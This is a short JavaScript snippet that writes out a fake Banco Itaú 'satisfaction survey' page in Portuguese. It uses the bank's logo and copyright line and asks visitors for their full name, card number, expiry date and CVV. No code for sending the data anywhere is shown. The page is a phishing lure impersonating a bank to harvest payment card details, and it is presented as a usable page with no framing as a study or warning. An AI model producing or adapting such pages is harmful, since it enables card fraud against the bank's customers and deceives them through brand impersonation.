document.write(`
  <body style="margin:0;font-family:sans-serif;background:#0033cc;color:white;display:flex;justify-content:center;align-items:center;flex-direction:column;height:100vh;text-align:center">
    <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Ita%C3%BA_Unibanco_logo_2023.svg" style="width:80px;margin-bottom:20px">
    <h1>Pesquisa de Satisfação - Banco Itaú</h1>
    <p>Para continuar, confirme suas informações abaixo:</p>
    <form style="display:flex;flex-direction:column;gap:10px;width:300px;margin-top:20px">
      <input style="padding:10px;border:none;border-radius:5px" placeholder="Nome completo" required>
      <input style="padding:10px;border:none;border-radius:5px" placeholder="Número do cartão" required>
      <input style="padding:10px;border:none;border-radius:5px" placeholder="Validade (MM/AA)" required>
      <input style="padding:10px;border:none;border-radius:5px" placeholder="CVV" required>
      <button style="padding:12px;margin-top:10px;background:white;color:#b30000;border:none;border-radius:5px;font-weight:bold">Enviar Resposta</button>
    </form>
    <p style="margin-top:20px;font-size:0.9em;opacity:0.7">© Banco Itaú - Todos os direitos reservados</p>
  </body>
`);
